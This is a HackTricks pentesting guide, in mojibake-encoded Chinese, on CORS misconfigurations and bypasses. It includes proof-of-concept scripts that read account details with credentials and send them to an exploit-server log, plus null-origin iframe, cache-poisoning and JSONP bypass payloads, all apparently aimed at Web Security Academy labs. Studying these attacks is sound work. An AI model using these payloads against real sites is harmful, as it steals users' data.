# CORS - é…ç½®é”™è¯¯ä¸ç»•è¿‡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## ä»€ä¹ˆæ˜¯CORSï¼Ÿ

CORSï¼ˆè·¨æºèµ„æºå…±äº«ï¼‰æ ‡å‡†ä¹‹æ‰€ä»¥éœ€è¦ï¼Œæ˜¯å› ä¸ºå®ƒ**å…è®¸æœåŠ¡å™¨æŒ‡å®šè°å¯ä»¥è®¿é—®å…¶èµ„æº**ä»¥åŠå…è®¸æ¥è‡ªå¤–éƒ¨èµ„æºçš„å“ªäº›**HTTPè¯·æ±‚æ–¹æ³•**ã€‚

**åŒæº**ç­–ç•¥è¦æ±‚è¯·æ±‚èµ„æºçš„**æœåŠ¡å™¨**å’Œå­˜æ”¾**èµ„æº**çš„æœåŠ¡å™¨ä½¿ç”¨ç›¸åŒçš„åè®®([http://),åŸŸå](http://\),åŸŸå) (internal-web.com) å’Œç›¸åŒçš„**ç«¯å£** (80)ã€‚å› æ­¤ï¼Œå¦‚æœæœåŠ¡å™¨å¼ºåˆ¶æ‰§è¡ŒåŒæºç­–ç•¥ï¼Œé‚£ä¹ˆåªæœ‰æ¥è‡ªç›¸åŒåŸŸåå’Œç«¯å£çš„ç½‘é¡µæ‰èƒ½è®¿é—®èµ„æºã€‚

ä¸‹è¡¨æ˜¾ç¤ºäº†åœ¨`http://normal-website.com/example/example.html`ä¸­å¦‚ä½•åº”ç”¨åŒæºç­–ç•¥ï¼š

| è®¿é—®çš„URL                                    | æ˜¯å¦å…è®¸è®¿é—®ï¼Ÿ                      |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | æ˜¯ï¼šç›¸åŒçš„æ–¹æ¡ˆã€åŸŸåå’Œç«¯å£ |
| `http://normal-website.com/example2/`     | æ˜¯ï¼šç›¸åŒçš„æ–¹æ¡ˆã€åŸŸåå’Œç«¯å£ |
| `https://normal-website.com/example/`     | å¦ï¼šä¸åŒçš„æ–¹æ¡ˆå’Œç«¯å£      |
| `http://en.normal-website.com/example/`   | å¦ï¼šä¸åŒçš„åŸŸå               |
| `http://www.normal-website.com/example/`  | å¦ï¼šä¸åŒçš„åŸŸå               |
| `http://normal-website.com:8080/example/` | å¦ï¼šä¸åŒçš„ç«¯å£\*               |

\*_Internet Explorerä¼šå…è®¸æ­¤è®¿é—®ï¼Œå› ä¸ºIEåœ¨åº”ç”¨åŒæºç­–ç•¥æ—¶ä¸è€ƒè™‘ç«¯å£å·ã€‚_

### `Access-Control-Allow-Origin` å¤´

`Access-Control-Allow-Origin` çš„è§„èŒƒå…è®¸**å¤šä¸ªæº**ï¼Œæˆ–å€¼**`null`**ï¼Œæˆ–é€šé…ç¬¦**`*`**ã€‚ç„¶è€Œï¼Œ**æ²¡æœ‰æµè§ˆå™¨æ”¯æŒå¤šä¸ªæº**ï¼Œå¹¶ä¸”å¯¹ä½¿ç”¨é€šé…ç¬¦`*`æœ‰**é™åˆ¶**ã€‚ï¼ˆ_é€šé…ç¬¦åªèƒ½å•ç‹¬ä½¿ç”¨ï¼Œè¿™å°†å¤±è´¥ `Access-Control-Allow-Origin: https://*.normal-website.com` å¹¶ä¸”å®ƒä¸èƒ½ä¸_ _Access-Control-Allow-Credentials: true_ ä¸€èµ·ä½¿ç”¨ï¼‰

å½“ç½‘ç«™è¯·æ±‚è·¨åŸŸèµ„æºæ—¶ï¼Œå¸¦æœ‰æµè§ˆå™¨æ·»åŠ çš„`Origin`å¤´çš„è¿™ä¸ªå¤´æ˜¯**ç”±æœåŠ¡å™¨è¿”å›**çš„ã€‚

### `Access-Control-Allow-Credentials` å¤´

è·¨æºèµ„æºè¯·æ±‚çš„**é»˜è®¤**è¡Œä¸ºæ˜¯**è¯·æ±‚**è¢«**ä¼ é€’è€Œä¸å¸¦å‡­è¯**ï¼Œå¦‚cookieså’ŒAuthorizationå¤´ã€‚ç„¶è€Œï¼Œè·¨åŸŸæœåŠ¡å™¨å¯ä»¥é€šè¿‡è®¾ç½®CORS **`Access-Control-Allow-Credentials`** å¤´ä¸º **`true`**ï¼Œ**å…è®¸è¯»å–**å½“**å‡­è¯**è¢«**ä¼ é€’**ç»™å®ƒæ—¶çš„**å“åº”**ã€‚

å¦‚æœå€¼è®¾ç½®ä¸º`true`ï¼Œé‚£ä¹ˆæµè§ˆå™¨å°†å‘é€å‡­è¯ï¼ˆcookies, authorizationå¤´æˆ–TLSå®¢æˆ·ç«¯è¯ä¹¦ï¼‰ã€‚
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### é¢„æ£€è¯·æ±‚

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå½“ä¸€ä¸ªè·¨åŸŸè¯·æ±‚ï¼š

* åŒ…å«**éæ ‡å‡†HTTPæ–¹æ³•ï¼ˆHEAD, GET, POSTï¼‰**
* åŒ…å«æ–°çš„**å¤´éƒ¨**
* åŒ…å«ç‰¹æ®Šçš„**Content-Typeå¤´éƒ¨å€¼**

{% hint style="info" %}
**æ£€æŸ¥**[**æ­¤é“¾æ¥**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)ä¸­çš„è¯·æ±‚æ¡ä»¶ï¼Œä»¥é¿å…å‘é€é¢„æ£€è¯·æ±‚
{% endhint %}

è·¨åŸŸè¯·æ±‚ä¹‹å‰ä¼šæœ‰ä¸€ä¸ªä½¿ç”¨**`OPTIONS`** **æ–¹æ³•**çš„**è¯·æ±‚**ï¼ŒCORSåè®®éœ€è¦å…ˆæ£€æŸ¥åœ¨å…è®¸è·¨åŸŸè¯·æ±‚ä¹‹å‰**å“ªäº›æ–¹æ³•å’Œå¤´éƒ¨æ˜¯è¢«å…è®¸çš„**ã€‚è¿™ç§°ä¸º**é¢„æ£€æŸ¥**ã€‚æœåŠ¡å™¨**è¿”å›å…è®¸çš„æ–¹æ³•åˆ—è¡¨**ï¼Œä»¥åŠ**å¯ä¿¡æ¥æº**ï¼Œç„¶åæµè§ˆå™¨æ£€æŸ¥è¯·æ±‚ç½‘ç«™çš„æ–¹æ³•æ˜¯å¦è¢«å…è®¸ã€‚

{% hint style="danger" %}
æ³¨æ„ï¼Œå³ä½¿å› ä¸º"å¸¸è§„è¯·æ±‚"æ¡ä»¶å¾—åˆ°å°Šé‡è€Œ**æ²¡æœ‰å‘é€é¢„æ£€è¯·æ±‚**ï¼Œ**å“åº”ä¹Ÿéœ€è¦æœ‰æˆæƒå¤´éƒ¨**ï¼Œå¦åˆ™**æµè§ˆå™¨**å°†**æ— æ³•è¯»å–è¯·æ±‚çš„å“åº”**ã€‚
{% endhint %}

**ä¾‹å¦‚**ï¼Œè¿™æ˜¯ä¸€ä¸ªé¢„æ£€è¯·æ±‚ï¼Œå®ƒè¯•å›¾**ä½¿ç”¨`PUT`æ–¹æ³•**ï¼Œå¹¶ä¸”å¸¦æœ‰ä¸€ä¸ªåä¸º`Special-Request-Header`çš„**è‡ªå®šä¹‰**è¯·æ±‚**å¤´éƒ¨**ï¼š
```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```
æœåŠ¡å™¨å¯èƒ½ä¼šè¿”å›å¦‚ä¸‹å“åº”ï¼š
```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* `Access-Control-Allow-Headers` å…è®¸çš„å¤´éƒ¨
* `Access-Control-Expose-Headers`
* `Access-Control-Max-Age` å®šä¹‰ç¼“å­˜é¢„æ£€å“åº”ä»¥ä¾›é‡ç”¨çš„æœ€å¤§æ—¶é—´æ¡†æ¶
* `Access-Control-Request-Headers` è·¨åŸŸè¯·æ±‚å¸Œæœ›å‘é€çš„å¤´éƒ¨
* `Access-Control-Request-Method` è·¨åŸŸè¯·æ±‚å¸Œæœ›ä½¿ç”¨çš„æ–¹æ³•
* `Origin` è·¨åŸŸè¯·æ±‚çš„æ¥æºï¼ˆç”±æµè§ˆå™¨è‡ªåŠ¨è®¾ç½®ï¼‰

![](../.gitbook/assets/preflight.svg)

è¯·æ³¨æ„ï¼Œé€šå¸¸ï¼ˆå–å†³äºè®¾ç½®çš„å†…å®¹ç±»å‹å’Œå¤´éƒ¨ï¼‰ï¼Œåœ¨ **GET/POST è¯·æ±‚ä¸­ä¸ä¼šå‘é€é¢„æ£€è¯·æ±‚**ï¼ˆè¯·æ±‚ä¼š**ç›´æ¥**å‘é€ï¼‰ï¼Œä½†å¦‚æœæ‚¨æƒ³è¦è®¿é—®**å“åº”çš„å¤´éƒ¨/æ­£æ–‡**ï¼Œå®ƒå¿…é¡»åŒ…å«ä¸€ä¸ªå…è®¸çš„ _Access-Control-Allow-Origin_ å¤´éƒ¨ã€‚\
**å› æ­¤ï¼ŒCORS å¹¶ä¸é˜²æŠ¤ CSRFï¼ˆä½†å®ƒå¯èƒ½æœ‰å¸®åŠ©ï¼‰ã€‚**

### **æœ¬åœ°ç½‘ç»œè¯·æ±‚ é¢„æ£€è¯·æ±‚**

å½“è¯·æ±‚å‘é€åˆ°æœ¬åœ°ç½‘ç»œ IP åœ°å€æ—¶ï¼Œä¼šå‘é€ 2 ä¸ªé¢å¤–çš„ CORS å¤´éƒ¨ï¼š

* `Access-Control-Request-Local-Network` å®¢æˆ·ç«¯è¯·æ±‚å¤´éƒ¨è¡¨æ˜è¯¥è¯·æ±‚æ˜¯ä¸€ä¸ªæœ¬åœ°ç½‘ç»œè¯·æ±‚
* `Access-Control-Allow-Local-Network` æœåŠ¡å™¨å“åº”å¤´éƒ¨è¡¨æ˜èµ„æºå¯ä»¥å®‰å…¨åœ°ä¸å¤–éƒ¨ç½‘ç»œå…±äº«

**æœ‰æ•ˆå“åº”å…è®¸æœ¬åœ°ç½‘ç»œè¯·æ±‚** éœ€è¦åœ¨å“åº”ä¸­ä¹ŸåŒ…å«å¤´éƒ¨ `Access-Controls-Allow-Local_network: true`ï¼š
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://public.example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œlinuxçš„ **0.0.0.0** IPåœ°å€å¯ä»¥ç”¨æ¥**ç»•è¿‡**è¿™äº›è¦æ±‚ä»¥è®¿é—®localhostï¼Œå› ä¸ºè¯¥IPåœ°å€ä¸è¢«è§†ä¸ºâ€œæœ¬åœ°â€ã€‚

å¦‚æœæ‚¨ä½¿ç”¨**æœ¬åœ°ç«¯ç‚¹çš„å…¬å…±IPåœ°å€**ï¼ˆå¦‚è·¯ç”±å™¨çš„å…¬å…±IPï¼‰ï¼Œä¹Ÿå¯ä»¥**ç»•è¿‡æœ¬åœ°ç½‘ç»œè¦æ±‚**ã€‚å› ä¸ºåœ¨å¤šç§æƒ…å†µä¸‹ï¼Œå³ä½¿æ˜¯åœ¨è®¿é—®**å…¬å…±IP**ï¼Œå¦‚æœæ˜¯**æ¥è‡ªæœ¬åœ°ç½‘ç»œ**ï¼Œä¹Ÿä¼šè¢«æˆäºˆè®¿é—®æƒé™ã€‚

{% endhint %}

## å¯åˆ©ç”¨çš„é”™è¯¯é…ç½®

è¯·æ³¨æ„ï¼Œå¤§å¤šæ•°**çœŸå®æ”»å‡»éœ€è¦è®¾ç½®`Access-Control-Allow-Credentials`**ä¸º**`true`**ï¼Œå› ä¸ºè¿™å°†å…è®¸æµè§ˆå™¨å‘é€å‡­æ®å¹¶è¯»å–å“åº”ã€‚æ²¡æœ‰å‡­æ®ï¼Œè®¸å¤šæ”»å‡»å˜å¾—æ— å…³ç´§è¦ï¼›è¿™æ„å‘³ç€ä½ ä¸èƒ½åˆ©ç”¨ç”¨æˆ·çš„cookiesï¼Œæ‰€ä»¥é€šå¸¸æ²¡æœ‰ä»€ä¹ˆå¥½å¤„ï¼Œè®©ä»–ä»¬çš„æµè§ˆå™¨å‘èµ·è¯·æ±‚è€Œä¸æ˜¯ä½ è‡ªå·±å‘èµ·ã€‚

ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ä¾‹å¤–æ˜¯ï¼Œå½“**å—å®³è€…çš„ç½‘ç»œä½ç½®å……å½“ä¸€ç§è®¤è¯æ–¹å¼**æ—¶ã€‚ä½ å¯ä»¥ä½¿ç”¨å—å®³è€…çš„æµè§ˆå™¨ä½œä¸ºä»£ç†ï¼Œç»•è¿‡åŸºäºIPçš„è®¤è¯ï¼Œè®¿é—®å†…ç½‘åº”ç”¨ç¨‹åºã€‚åœ¨å½±å“æ–¹é¢ï¼Œè¿™ä¸DNSé‡ç»‘å®šç±»ä¼¼ï¼Œä½†è¦åˆ©ç”¨èµ·æ¥å®¹æ˜“å¾—å¤šã€‚

### åå°„çš„`Origin`åœ¨`Access-Control-Allow-Origin`

åœ¨ç°å®ä¸–ç•Œä¸­ï¼Œè¿™æ˜¯ä¸å¯èƒ½å‘ç”Ÿçš„ï¼Œå› ä¸º**è¿™ä¸¤ä¸ªå¤´éƒ¨çš„å€¼æ˜¯ä¸å…è®¸åŒæ—¶ä½¿ç”¨çš„**ã€‚\
åŒæ ·ï¼Œè®¸å¤šå¼€å‘è€…å¸Œæœ›åœ¨CORSä¸­**å…è®¸å¤šä¸ªURL**ï¼Œä½†æ˜¯ä¸å…è®¸ä½¿ç”¨å­åŸŸé€šé…ç¬¦æˆ–URLåˆ—è¡¨ã€‚ç„¶åï¼Œä¸€äº›å¼€å‘è€…ä¼š**åŠ¨æ€ç”Ÿæˆ**\*\*`Access-Control-Allow-Origin`\*\*å¤´éƒ¨ï¼Œåœ¨ä¸æ­¢ä¸€ä¸ªåœºåˆä¸­ï¼Œä»–ä»¬åªæ˜¯**å¤åˆ¶Originå¤´éƒ¨çš„å€¼**ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**ç›¸åŒçš„æ¼æ´å¯èƒ½ä¼šè¢«åˆ©ç”¨ã€‚**

åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œå¼€å‘è€…å¯èƒ½ä¼šæ£€æŸ¥**åŸŸå**ï¼ˆ_victimdomain.com_ï¼‰æ˜¯å¦**å‡ºç°**åœ¨**Originå¤´éƒ¨**ä¸­ï¼Œé‚£ä¹ˆï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåä¸º**`attackervictimdomain.com`**çš„åŸŸåæ¥çªƒå–æœºå¯†ä¿¡æ¯ã€‚
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### `null` æº

`null` æ˜¯ **Origin** å¤´çš„ä¸€ä¸ªç‰¹æ®Šå€¼ã€‚è§„èŒƒæåˆ°å®ƒä¼šåœ¨é‡å®šå‘å’Œæœ¬åœ° HTML æ–‡ä»¶ä¸­è¢«è§¦å‘ã€‚ä¸€äº›åº”ç”¨ç¨‹åºå¯èƒ½ä¼šå°† `null` æºåˆ—å…¥ç™½åå•ï¼Œä»¥æ”¯æŒåº”ç”¨ç¨‹åºçš„æœ¬åœ°å¼€å‘ã€‚\
è¿™å¾ˆå¥½ï¼Œå› ä¸º**è®¸å¤šåº”ç”¨ç¨‹åºä¼šå…è®¸è¿™ä¸ªå€¼**åœ¨ CORS ä¸­ï¼Œå¹¶ä¸”ä»»ä½•**ç½‘ç«™éƒ½å¯ä»¥é€šè¿‡ä½¿ç”¨æ²™ç›’åŒ–çš„ iframe è½»æ¾è·å¾— null æº**ï¼š
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### **Regexp ç»•è¿‡**

å¦‚æœä½ å‘ç°åŸŸå _victim.com_ è¢«**åˆ—å…¥ç™½åå•**ï¼Œä½ åº”è¯¥æ£€æŸ¥ _victim.com.**attacker.com**_ æ˜¯å¦ä¹Ÿ**è¢«åˆ—å…¥ç™½åå•**ï¼Œæˆ–è€…ï¼Œå¦‚æœä½ èƒ½**æ¥ç®¡æŸä¸ªå­åŸŸå**ï¼Œæ£€æŸ¥ _**somesubdomain**.victim.com_ æ˜¯å¦è¢«åˆ—å…¥ç™½åå•ã€‚

### **é«˜çº§ Regexp ç»•è¿‡**

å¤§å¤šæ•°ç”¨äºåœ¨å­—ç¬¦ä¸²ä¸­è¯†åˆ«åŸŸåçš„æ­£åˆ™è¡¨è¾¾å¼ä¼šå…³æ³¨å­—æ¯æ•°å­— ASCII å­—ç¬¦å’Œ `.-`ã€‚ç„¶åï¼Œåƒ Origin å¤´ä¸­çš„ `victimdomain.com{.attacker.com` ä¼šè¢«æ­£åˆ™è¡¨è¾¾å¼è§£é‡Šä¸ºåŸŸåæ˜¯ `victimdomain.com`ï¼Œä½†æµè§ˆå™¨ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ Safari æ”¯æŒåŸŸåä¸­çš„è¿™ä¸ªå­—ç¬¦ï¼‰ä¼šè®¿é—®åŸŸå `attacker.com`ã€‚

`_` å­—ç¬¦ï¼ˆåœ¨å­åŸŸåä¸­ï¼‰ä¸ä»…åœ¨ Safari ä¸­æ”¯æŒï¼Œè€Œä¸”åœ¨ Chrome å’Œ Firefox ä¸­ä¹Ÿæ”¯æŒï¼

**å› æ­¤ï¼Œä½¿ç”¨è¿™äº›å­åŸŸåä¹‹ä¸€ï¼Œä½ å¯ä»¥ç»•è¿‡ä¸€äº›â€œå¸¸è§â€çš„æ­£åˆ™è¡¨è¾¾å¼æ¥æ‰¾åˆ° URL çš„ä¸»åŸŸåã€‚**

**æœ‰å…³æ­¤ç»•è¿‡çš„æ›´å¤šä¿¡æ¯å’Œè®¾ç½®ï¼Œè¯·æŸ¥çœ‹ï¼š** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **å’Œ** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![](<../.gitbook/assets/image (153).png>)

### æ¥è‡ªå­åŸŸåå†…çš„ XSS

å¼€å‘è€…ä½¿ç”¨çš„ä¸€ç§é˜²å¾¡æœºåˆ¶æ˜¯å°†ç»å¸¸è¯·æ±‚è®¿é—®ä¿¡æ¯çš„åŸŸååˆ—å…¥ç™½åå•ï¼Œä»¥é˜²æ­¢ CORS æ¼æ´çš„åˆ©ç”¨ã€‚ç„¶è€Œï¼Œè¿™å¹¶ä¸å®Œå…¨å®‰å…¨ï¼Œå› ä¸ºå¦‚æœ**ç™½åå•**ä¸­çš„**ä»»ä½•ä¸€ä¸ª**å­åŸŸåå¯¹å…¶ä»–æ¼æ´å¦‚ **XSS** æ˜¯**æ˜“å—æ”»å‡»çš„**ï¼Œå®ƒå¯ä»¥ä½¿ CORS æ¼æ´åˆ©ç”¨æˆä¸ºå¯èƒ½ã€‚

è®©æˆ‘ä»¬è€ƒè™‘ä¸€ä¸ªä¾‹å­ï¼Œä»¥ä¸‹ä»£ç æ˜¾ç¤ºäº†å…è®¸ _requester.com_ çš„å­åŸŸåè®¿é—® _provider.com_ èµ„æºçš„é…ç½®ã€‚
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com')
{
//Access data
else{ // unauthorized access}
}
```
### **æœåŠ¡å™¨ç«¯ç¼“å­˜æŠ•æ¯’**

å¦‚æœæ¡ä»¶å…è®¸ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šé€šè¿‡HTTPå¤´æ³¨å…¥åˆ©ç”¨æœåŠ¡å™¨ç«¯ç¼“å­˜æŠ•æ¯’æ¥åˆ›å»ºä¸€ä¸ª[å­˜å‚¨å‹XSS](https://portswigger.net/web-security/cross-site-scripting/stored)æ¼æ´ã€‚

å¦‚æœä¸€ä¸ªåº”ç”¨ç¨‹åº**åå°„**äº†**Originå¤´**ï¼Œç”šè‡³æ²¡æœ‰æ£€æŸ¥å®ƒæ˜¯å¦åŒ…å«éæ³•å­—ç¬¦ï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬å®é™…ä¸Šå°±æœ‰äº†ä¸€ä¸ª**é’ˆå¯¹IE/Edgeç”¨æˆ·çš„HTTPå¤´æ³¨å…¥æ¼æ´ï¼Œå› ä¸ºInternet Explorerå’ŒEdgeå°†\r (0x0d)è§†ä¸ºæœ‰æ•ˆçš„HTTPå¤´ç»ˆæ­¢ç¬¦**ï¼š`GET / HTTP/1.1`\
`Origin: z[0x0d]Content-Type: text/html; charset=UTF-7`

Internet Explorerå°†å“åº”è§†ä¸ºï¼š

`HTTP/1.1 200 OK`\
`Access-Control-Allow-Origin: z`\
`Content-Type: text/html; charset=UTF-7`

è¿™ä¸æ˜¯ç›´æ¥å¯åˆ©ç”¨çš„ï¼Œå› ä¸ºæ²¡æœ‰åŠæ³•è®©æ”»å‡»è€…ä½¿æŸäººçš„æµè§ˆå™¨å‘é€è¿™æ ·æ ¼å¼é”™è¯¯çš„å¤´ï¼Œä½†æˆ‘å¯ä»¥**åœ¨Burp Suiteä¸­æ‰‹åŠ¨æ„é€ è¿™ä¸ªè¯·æ±‚ï¼ŒæœåŠ¡å™¨ç«¯ç¼“å­˜å¯èƒ½ä¼šä¿å­˜è¿™ä¸ªå“åº”å¹¶å°†å…¶æä¾›ç»™å…¶ä»–äºº**ã€‚æˆ‘ä½¿ç”¨çš„æœ‰æ•ˆè½½è·å°†é¡µé¢çš„å­—ç¬¦é›†æ›´æ”¹ä¸º**UTF-7**ï¼Œè¿™å¯¹äºåˆ›å»ºXSSæ¼æ´éå¸¸æœ‰ç”¨ã€‚

### **å®¢æˆ·ç«¯ç¼“å­˜æŠ•æ¯’**

ä½ å¯èƒ½å¶å°”é‡åˆ°è¿‡ä¸€ä¸ªé¡µé¢ï¼Œå®ƒåœ¨è‡ªå®šä¹‰HTTPå¤´ä¸­åå°„äº†[åå°„å‹XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)ã€‚å‡è®¾ä¸€ä¸ªç½‘é¡µåå°„äº†ä¸€ä¸ªè‡ªå®šä¹‰å¤´çš„å†…å®¹ï¼Œè€Œæ²¡æœ‰ç¼–ç ï¼š
```http
GET / HTTP/1.1
Host: example.com
X-User-id: &lt;svg/onload=alert\(1\)&gt;

HTTP/1.1 200 OK
Access-Control-Allow-Origin: \*
Access-Control-Allow-Headers: X-User-id
Content-Type: text/html
...
Invalid user: &lt;svg/onload=alert\(1\)&gt;\
```
åœ¨CORSä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨Headerä¸­å‘é€ä»»ä½•å€¼ã€‚æœ¬èº«è¿™æ˜¯**æ— ç”¨çš„**ï¼Œå› ä¸ºåŒ…å«æˆ‘ä»¬**æ³¨å…¥çš„JavaScriptçš„å“åº”ä¸ä¼šè¢«æ¸²æŸ“**ã€‚ç„¶è€Œï¼Œ**å¦‚æœæ²¡æœ‰æŒ‡å®šVary: Origin**ï¼Œå“åº”**å¯èƒ½ä¼šè¢«å­˜å‚¨åœ¨æµè§ˆå™¨ç¼“å­˜ä¸­ï¼Œå¹¶åœ¨æµè§ˆå™¨å¯¼èˆªåˆ°å…³è”URLæ—¶ç›´æ¥æ˜¾ç¤º**ã€‚æˆ‘åˆ¶ä½œäº†ä¸€ä¸ªfiddleæ¥[å°è¯•å¯¹æ‚¨é€‰æ‹©çš„URLå‘èµ·è¿™ç§æ”»å‡»](https://jsfiddle.net/3gk8u8wu/3/)ã€‚ç”±äºè¿™ç§æ”»å‡»ä½¿ç”¨äº†å®¢æˆ·ç«¯ç¼“å­˜ï¼Œå®ƒå®é™…ä¸Šç›¸å½“å¯é ã€‚
```markup
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // beware of mixed content blocking when targeting HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
req.send();
</script>
```
## ç»•è¿‡

### XSSI (è·¨ç«™è„šæœ¬åŒ…å«) / JSONP

XSSI æŒ‡çš„æ˜¯ä¸€ç§æ¼æ´ï¼Œå®ƒåˆ©ç”¨äº†è¿™æ ·ä¸€ä¸ªäº‹å®ï¼šå½“ä½¿ç”¨ `script` æ ‡ç­¾åŒ…å«èµ„æºæ—¶ï¼ŒåŒæºç­–ç•¥ï¼ˆSOPï¼‰ä¸é€‚ç”¨ï¼Œå› ä¸ºè„šæœ¬å¿…é¡»èƒ½å¤Ÿè·¨åŸŸåŒ…å«ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥è¯»å–ä½¿ç”¨ `script` æ ‡ç­¾åŒ…å«çš„æ‰€æœ‰å†…å®¹ã€‚

å½“æ¶‰åŠåˆ°åŠ¨æ€ JavaScript æˆ– JSONP æ—¶ï¼Œè¿™ä¸€ç‚¹å°¤å…¶æœ‰è¶£ï¼Œå°¤å…¶æ˜¯å½“æ‰€è°“çš„ç¯å¢ƒæƒé™ä¿¡æ¯ï¼ˆå¦‚ cookiesï¼‰ç”¨äºè®¤è¯æ—¶ã€‚è¯·æ±‚æ¥è‡ªä¸åŒä¸»æœºçš„èµ„æºæ—¶ï¼Œcookies ä¼šè¢«åŒ…å«è¿›æ¥ã€‚BurpSuite æ’ä»¶ï¼š[https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp)

[**é˜…è¯»æ›´å¤šå…³äºä¸åŒç±»å‹çš„ XSSI ä»¥åŠå¦‚ä½•åˆ©ç”¨å®ƒä»¬çš„ä¿¡æ¯ã€‚**](xssi-cross-site-script-inclusion.md)

å°è¯•åœ¨è¯·æ±‚ä¸­æ·»åŠ ä¸€ä¸ª **`callback`** **å‚æ•°**ã€‚ä¹Ÿè®¸é¡µé¢å·²ç»å‡†å¤‡å¥½å°†æ•°æ®ä½œä¸º JSONP å‘é€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œé¡µé¢å°†è¿”å›æ•°æ®ï¼Œå¹¶ä½¿ç”¨ `Content-Type: application/javascript`ï¼Œè¿™å°†ç»•è¿‡ CORS ç­–ç•¥ã€‚

![](<../.gitbook/assets/image (229).png>)

### ç®€å•ï¼ˆæ— ç”¨ï¼Ÿï¼‰ç»•è¿‡

